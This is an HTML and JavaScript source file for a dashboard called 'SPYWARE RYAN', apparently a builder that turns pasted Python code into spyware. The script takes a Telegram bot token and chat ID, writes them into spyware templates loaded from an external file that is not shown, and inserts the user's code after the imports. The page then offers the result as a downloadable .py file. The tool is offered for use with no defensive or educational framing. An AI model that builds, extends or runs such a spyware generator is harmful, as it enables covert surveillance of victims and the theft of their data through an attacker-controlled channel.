<!doctype html>
<!-- language: HTML, file: index.html — SPYWARE RYAN dashboard, ringan -->
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>SPYWARE RYAN</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{
  background:#02000a;
  color:#f0eaff;
  font-family:'Space Mono',monospace;
  font-size:13px;
  line-height:1.5;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
}

/* ============ GALAXY BG — ringan, cuma bintang ============ */
body::before{
  content:"";
  position:fixed;inset:0;z-index:-3;
  background:
    radial-gradient(ellipse 80% 60% at 20% 15%,#1a0b3d 0%,transparent 55%),
    radial-gradient(ellipse 70% 50% at 85% 75%,#2d0a5c 0%,transparent 55%),
    radial-gradient(ellipse 90% 80% at 50% 110%,#0a0420 0%,transparent 65%),
    #02000a;
}
body::after{
  content:"";
  position:fixed;inset:0;z-index:-2;
  background-image:
    radial-gradient(1px 1px at 10% 20%,#fff,transparent),
    radial-gradient(1px 1px at 30% 60%,#c4b5fd,transparent),
    radial-gradient(1px 1px at 55% 15%,#fff,transparent),
    radial-gradient(1px 1px at 75% 40%,#a5f3fc,transparent),
    radial-gradient(1px 1px at 90% 80%,#fff,transparent),
    radial-gradient(1.5px 1.5px at 25% 30%,#fff,transparent),
    radial-gradient(1.5px 1.5px at 60% 70%,#a78bfa,transparent),
    radial-gradient(1.5px 1.5px at 85% 15%,#fff,transparent),
    radial-gradient(2px 2px at 50% 20%,#fff,transparent),
    radial-gradient(2px 2px at 15% 60%,#c084fc,transparent),
    radial-gradient(2px 2px at 80% 90%,#fff,transparent),
    radial-gradient(1px 1px at 42% 92%,#fff,transparent),
    radial-gradient(1px 1px at 68% 55%,#c4b5fd,transparent),
    radial-gradient(1.5px 1.5px at 5% 75%,#67e8f9,transparent);
  background-size:300px 300px;
  animation:starTwinkle 5s ease-in-out infinite;
}
@keyframes starTwinkle{
  0%,100%{opacity:.55}
  50%{opacity:1}
}

/* ============ SHOOTING STAR ============ */
.shoot{
  position:fixed;top:0;left:0;
  width:2px;height:2px;background:#fff;
  border-radius:50%;z-index:-1;pointer-events:none;
  box-shadow:0 0 10px 3px #fff,0 0 30px 8px rgba(180,120,255,.6);
  animation:shootMove 8s linear infinite;
}
.shoot::after{
  content:"";position:absolute;top:0;left:0;
  width:140px;height:1px;
  background:linear-gradient(90deg,#fff,rgba(192,132,252,.6),transparent);
  transform:translateX(-140px) rotate(180deg);
  transform-origin:right center;
}
.shoot.s2{animation-delay:4s;animation-duration:11s}
@keyframes shootMove{
  0%{transform:translate(-50px,50px) rotate(30deg);opacity:0}
  5%{opacity:1}
  20%{transform:translate(60vw,40vh) rotate(30deg);opacity:1}
  25%{transform:translate(90vw,60vh) rotate(30deg);opacity:0}
  100%{transform:translate(90vw,60vh) rotate(30deg);opacity:0}
}

/* ============ LAYOUT — compact ============ */
.wrap{
  max-width:480px;margin:0 auto;
  padding:10px 10px 24px;
  position:relative;z-index:1;
}

.topbar{
  display:flex;align-items:center;gap:8px;
  padding:10px 12px;
  border:1px solid rgba(139,92,246,.4);
  border-radius:10px;
  background:rgba(10,6,25,.7);
  backdrop-filter:blur(14px);
  -webkit-backdrop-filter:blur(14px);
  box-shadow:0 0 24px rgba(139,92,246,.25);
  margin-bottom:10px;
}
.logo{
  font-family:'Orbitron',monospace;
  font-weight:900;font-size:12px;letter-spacing:2px;
  background:linear-gradient(90deg,#c084fc,#22d3ee 50%,#f472b6);
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 8px rgba(139,92,246,.9));
}
.chip{
  font-size:7px;color:#c084fc;letter-spacing:1.5px;
  border:1px solid rgba(192,132,252,.5);
  padding:3px 6px;border-radius:4px;
  background:rgba(139,92,246,.1);
  text-transform:uppercase;white-space:nowrap;
}
.spacer{flex:1}
.pill{
  display:inline-flex;align-items:center;gap:5px;
  font-size:8px;letter-spacing:1.5px;color:#22d3ee;
  border:1px solid rgba(34,211,238,.5);
  padding:4px 8px;border-radius:5px;
  background:rgba(34,211,238,.08);
  text-transform:uppercase;white-space:nowrap;
}
.pill .dot{
  width:5px;height:5px;border-radius:50%;
  background:#4ade80;
  box-shadow:0 0 8px #4ade80;
  animation:pulse 1.8s ease-in-out infinite;
}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

.card{
  border:1px solid rgba(139,92,246,.35);
  border-radius:11px;
  background:rgba(10,6,25,.72);
  backdrop-filter:blur(14px);
  -webkit-backdrop-filter:blur(14px);
  padding:14px 14px;
  margin-bottom:10px;
  position:relative;overflow:hidden;
  box-shadow:0 6px 24px rgba(0,0,0,.4),inset 0 0 40px rgba(139,92,246,.04);
}
.card::before{
  content:"";position:absolute;top:0;left:20%;right:20%;height:1px;
  background:linear-gradient(90deg,transparent,#c084fc,#22d3ee,#f472b6,transparent);
  opacity:.6;
}

.hero{
  font-family:'Orbitron',monospace;
  font-weight:900;font-size:22px;line-height:1.1;letter-spacing:2px;
  text-align:center;text-transform:uppercase;margin:4px 0 2px;
  background:linear-gradient(135deg,#c084fc,#22d3ee 35%,#f472b6 65%,#c084fc);
  background-size:300% 300%;
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 16px rgba(139,92,246,.7));
}
.sub{
  text-align:center;font-size:9px;color:#9a8fba;
  letter-spacing:3px;margin-bottom:12px;text-transform:uppercase;
}

label{
  display:block;font-size:9px;color:#c084fc;
  letter-spacing:1.5px;margin:9px 0 4px;
  text-transform:uppercase;font-weight:700;
}
input,select,textarea{
  width:100%;padding:9px 11px;border-radius:8px;
  border:1px solid rgba(139,92,246,.4);
  background:rgba(4,2,12,.6);
  color:#f0eaff;
  font-family:'Space Mono',monospace;
  font-size:12px;outline:none;
  transition:border-color .2s,box-shadow .2s;
}
input:focus,textarea:focus,select:focus{
  border-color:#c084fc;
  background:rgba(20,10,40,.85);
  box-shadow:0 0 0 2px rgba(139,92,246,.2),0 0 16px rgba(139,92,246,.25);
}
textarea{
  min-height:130px;resize:vertical;
  font-size:11px;line-height:1.45;
}
input::placeholder,textarea::placeholder{color:#9a8fba;opacity:.5}
select option{background:#0a0614;color:#f0eaff}

button{
  width:100%;padding:12px;border-radius:9px;
  border:none;cursor:pointer;
  font-family:'Orbitron',monospace;
  font-weight:800;font-size:11px;
  letter-spacing:2px;text-transform:uppercase;
  background:linear-gradient(135deg,#7c3aed,#a855f7,#22d3ee,#a855f7);
  background-size:300% 300%;
  color:#fff;
  box-shadow:0 0 22px rgba(139,92,246,.5),0 3px 0 rgba(0,0,0,.3);
  transition:all .2s;
}
button:active{transform:translateY(2px) scale(.98)}

.tabs{
  display:grid;grid-template-columns:1fr 1fr;
  gap:8px;margin-bottom:10px;
}
.tab{
  border:1px solid rgba(139,92,246,.4);
  border-radius:9px;
  background:rgba(4,2,12,.55);
  padding:11px 8px;text-align:center;
  cursor:pointer;
  font-family:'Space Mono',monospace;
  font-weight:700;font-size:9px;
  letter-spacing:1.5px;color:#9a8fba;
  text-transform:uppercase;
  transition:all .25s;
}
.tab.active{
  border-color:#8b5cf6;color:#c084fc;
  background:rgba(139,92,246,.15);
  box-shadow:0 0 18px rgba(139,92,246,.35),inset 0 0 18px rgba(139,92,246,.1);
}
.tab .ico{display:block;font-size:16px;margin-bottom:3px}

.drop{
  border:2px dashed rgba(192,132,252,.5);
  border-radius:10px;
  background:rgba(4,2,12,.4);
  padding:22px 14px;text-align:center;
  cursor:pointer;transition:border-color .25s;
}
.drop:hover{
  border-color:#8b5cf6;
  background:rgba(139,92,246,.08);
}
.drop .ico{font-size:34px;margin-bottom:6px;display:block;
  filter:drop-shadow(0 0 12px rgba(139,92,246,.7))}
.drop .main{font-size:11px;color:#f0eaff;letter-spacing:1.5px;font-weight:700}
.drop .sub2{font-size:9px;color:#9a8fba;letter-spacing:1px;margin-top:3px}

.file-info{
  margin-top:9px;padding:9px;border-radius:8px;
  border:1px solid #22d3ee;
  background:rgba(34,211,238,.1);
  color:#22d3ee;font-size:10px;
}

.status{
  padding:10px 12px;border-radius:8px;
  margin-top:9px;font-size:10px;
  font-weight:700;letter-spacing:1px;
}
.status.ok{border:1px solid #4ade80;background:rgba(74,222,128,.1);color:#4ade80}
.status.err{border:1px solid #f87171;background:rgba(248,113,113,.1);color:#f87171}
.status.info{border:1px solid #22d3ee;background:rgba(34,211,238,.1);color:#22d3ee}

.download-box{
  margin-top:10px;padding:18px 14px;
  border-radius:11px;
  border:1px solid #8b5cf6;
  background:rgba(139,92,246,.1);
  text-align:center;
  box-shadow:0 0 28px rgba(139,92,246,.3);
}
.download-box .ico{font-size:40px;margin-bottom:8px;display:block;
  filter:drop-shadow(0 0 16px rgba(139,92,246,.9))}
.download-box .ttl{
  font-family:'Orbitron',monospace;
  font-weight:800;font-size:12px;color:#c084fc;
  letter-spacing:2px;text-transform:uppercase;margin-bottom:5px;
}
.download-box .meta{
  font-size:10px;color:#9a8fba;
  letter-spacing:1px;margin-bottom:10px;
}

.hidden{display:none!important}
.foot{
  text-align:center;font-size:8px;color:#9a8fba;
  letter-spacing:2px;text-transform:uppercase;
  padding:14px 0 4px;opacity:.5;
}
</style>
</head>
<body>

<div class="shoot"></div>
<div class="shoot s2"></div>

<div class="wrap">

  <div class="topbar">
    <span class="logo">SPYWARE·RYAN</span>
    <span class="chip">DASHBOARD</span>
    <span class="spacer"></span>
    <span class="pill"><span class="dot"></span>ONLINE</span>
  </div>

  <div class="card">
    <div class="hero">Spyware Ryan</div>
    <div class="sub">PYTHON INJECTOR</div>
  </div>

  <div class="card">
    <div class="tabs">
      <div class="tab active" id="tab-paste">
        <span class="ico">📋</span>PASTE
      </div>
      <div class="tab" id="tab-upload">
        <span class="ico">📁</span>UPLOAD
      </div>
    </div>

    <div id="src-paste">
      <label>Python Code</label>
      <textarea id="code-input" placeholder="# Paste code python di sini..."></textarea>
    </div>

    <div id="src-upload" class="hidden">
      <div class="drop" id="drop-zone">
        <span class="ico">📁</span>
        <div class="main">TAP TO UPLOAD .PY</div>
        <div class="sub2">atau drag &amp; drop</div>
      </div>
      <input type="file" id="file-input" accept=".py,.txt" class="hidden">
      <div id="file-info-wrap"></div>
    </div>
  </div>

  <div class="card">
    <label>Bot Token</label>
    <input id="bot-token" placeholder="123456:ABC...">

    <label>Chat ID</label>
    <input id="chat-id" placeholder="123456789">

    <label>Template</label>
    <select id="template-select">
      <option value="">— Pilih —</option>
      <option value="command">SPYWARE COMMAND</option>
      <option value="base">SPYWARE BASE</option>
    </select>

    <label>Nama File</label>
    <input id="output-name" value="spyware_ryan">

    <div style="height:10px"></div>
    <button id="generate-btn">⚡ GENERATE</button>

    <div id="status-wrap"></div>
  </div>

  <div class="card hidden" id="result-card">
    <div class="download-box">
      <span class="ico">⬇️</span>
      <div class="ttl">FILE SIAP</div>
      <div class="meta" id="result-meta">spyware_ryan.py</div>
      <button id="download-btn">⬇ DOWNLOAD .PY</button>
    </div>
  </div>

  <div class="foot">SPYWARE RYAN</div>

</div>

<script src="templates.js"></script>
<script>
var $ = function(id){ return document.getElementById(id); };

/* ============ TABS ============ */
$('tab-paste').onclick = function(){
  $('tab-paste').classList.add('active');
  $('tab-upload').classList.remove('active');
  $('src-paste').classList.remove('hidden');
  $('src-upload').classList.add('hidden');
};
$('tab-upload').onclick = function(){
  $('tab-upload').classList.add('active');
  $('tab-paste').classList.remove('active');
  $('src-upload').classList.remove('hidden');
  $('src-paste').classList.add('hidden');
};

/* ============ FILE UPLOAD ============ */
$('drop-zone').onclick = function(){ $('file-input').click(); };
$('file-input').onchange = function(e){
  var f = e.target.files[0];
  if (!f) return;
  var r = new FileReader();
  r.onload = function(ev){
    $('code-input').value = ev.target.result;
    $('file-info-wrap').innerHTML =
      '<div class="file-info">📄 ' + f.name + ' — ' + (f.size/1024).toFixed(1) + ' KB</div>';
  };
  r.readAsText(f);
};

/* ============ INJECT USER CODE ============ */
function injectUserCode(template, userCode){
  var lines = template.split('\n');
  var lastImport = -1;
  for (var i = 0; i < lines.length; i++){
    var ln = lines[i].trim();
    if (ln.indexOf('import ') === 0 || ln.indexOf('from ') === 0){
      lastImport = i;
    }
  }
  if (lastImport === -1){
    return userCode + '\n\n' + template;
  }
  var before = lines.slice(0, lastImport + 1).join('\n');
  var after = lines.slice(lastImport + 1).join('\n');
  return before
    + '\n\n# ========== USER CODE (INJECTED) ==========\n'
    + userCode
    + '\n# ========== END USER CODE ==========\n'
    + after;
}

/* ============ REPLACE PLACEHOLDER ============ */
function replacePlaceholders(template, botToken, chatId){
  var out = template;
  if (botToken){
    out = out.replace(/BOT_TOKEN\s*=\s*["'][^"']*["']/g,
      'BOT_TOKEN = "' + botToken + '"');
  }
  if (chatId){
    out = out.replace(/CHAT_ID\s*=\s*["'][^"']*["']/g,
      'CHAT_ID   = "' + chatId + '"');
  }
  return out;
}

/* ============ GENERATE ============ */
$('generate-btn').onclick = function(){
  var userCode = $('code-input').value.trim();
  var tpl = $('template-select').value;
  var botToken = $('bot-token').value.trim();
  var chatId = $('chat-id').value.trim();
  var sw = $('status-wrap');
  var rc = $('result-card');

  if (!userCode){
    sw.innerHTML = '<div class="status err">⚠️ Code python kosong</div>';
    rc.classList.add('hidden');
    return;
  }
  if (!tpl){
    sw.innerHTML = '<div class="status err">⚠️ Pilih template dulu</div>';
    rc.classList.add('hidden');
    return;
  }

  sw.innerHTML = '<div class="status info">⚙️ Memproses...</div>';

  setTimeout(function(){
    var template;
    if (tpl === 'command'){
      template = window.TEMPLATE_COMMAND || '';
    } else {
      template = window.TEMPLATE_BASE || '';
    }

    if (!template){
      sw.innerHTML = '<div class="status err">❌ Template kosong — cek templates.js</div>';
      return;
    }

    var withPlaceholders = replacePlaceholders(template, botToken, chatId);
    var finalCode = injectUserCode(withPlaceholders, userCode);

    window._generatedCode = finalCode;
    var sizeKb = (finalCode.length / 1024).toFixed(1);

    sw.innerHTML = '<div class="status ok">✅ Berhasil! ' + tpl.toUpperCase() +
      ' + user code · ' + sizeKb + ' KB</div>';

    var name = ($('output-name').value.trim() || 'spyware_ryan') + '.py';
    $('result-meta').textContent = name + ' · ' + sizeKb + ' KB';
    rc.classList.remove('hidden');
  }, 200);
};

/* ============ DOWNLOAD ============ */
$('download-btn').onclick = function(){
  var code = window._generatedCode;
  if (!code){
    alert('Generate dulu');
    return;
  }
  var name = ($('output-name').value.trim() || 'spyware_ryan') + '.py';
  var blob = new Blob([code], { type: 'text/x-python' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};
</script>

</body>
</html>
